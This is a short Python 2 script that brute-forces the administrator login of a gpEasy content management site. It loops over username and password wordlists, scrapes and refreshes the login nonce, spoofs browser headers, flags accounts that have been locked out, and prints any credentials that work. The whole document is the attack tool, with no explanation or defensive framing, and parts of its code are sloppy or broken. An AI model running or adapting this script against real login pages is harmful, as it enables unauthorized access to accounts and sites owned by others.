#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# by @nonroot, 2015
#
import sys, re, hashlib, time
import httplib, urllib 

host = "trytohackme.tklapp.com"
path = "/cms/index.php/Admin"
#host = "192.168.1.64"
#path = "/gpEasy/index.php/Admin"

pass_file = "claves.txt"
user_file = "users.txt"

def get_nonce(host,path):
 conn = httplib.HTTPConnection(host)
 params = urllib.urlencode({'':''})
 headers = {'':''}
 conn = httplib.HTTPConnection(host)
 conn.request("GET", path, params, headers)
 response = conn.getresponse()
 p = re.compile(ur'value="([a-zA-Z0-9_!"·.,-¿|$%&/()=?]*)"')
 fields = re.findall(p, response.read())
 return fields[2]


def OneTryMore(username,password,nonce):
  params = "file=Home&cmd=login&login_nonce="+nonce+"&username="+usuario+"&user_sha="+str(hashlib.sha1(nonce+usuario))+"&password="+password+"&pass_md5=&pass_sha=&pass_sha512=&verified=&verified=&verified="
  headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Referer':'http://trytohackme.tklapp.com/cms/index.php/Admin','Cookie':'g=2','Content-Type':'application/x-www-form-urlencoded','gp_session_cookie':'ROOT'}
  conn = httplib.HTTPConnection(host)
  conn.request("POST",path, params, headers)
  response = conn.getresponse()
  data=response.read()
  #print data
  #print usuario,clave
  if re.findall('Please try again',data):
     return 'False'
  elif re.findall('Expired Nonce',data):
     return 'Nonce'
  elif re.findall('The maximum number of login attempts has been exceeded',data):
     return 'Exist'
  else:
     return 'OK'

nonce=get_nonce(host,path)
print "[nonce]:"+nonce

with open(user_file) as usuarios:
    for usuario in usuarios:
	usuario = usuario.rstrip('\n')
	print "Testing Usuario: "+usuario+"..."
	with open(pass_file) as claves:
    	   for clave in claves:
		clave = clave.rstrip('\n')
		answer = OneTryMore(usuario,clave,nonce)
	 	if answer == 'Nonce':
		  nonce=get_nonce(host,path)
		  print "[new nonce]:"+nonce
		  OneTryMore(usuario,clave,nonce)
		elif answer == 'Exist':
		  print "[Usuario existe y esta bloqueado]:"+usuario
		  break
		elif answer == 'OK':
		  print "OK, I GOT IT::: "+usuario+" --> "+clave
		  exit()
		else:
		  pass
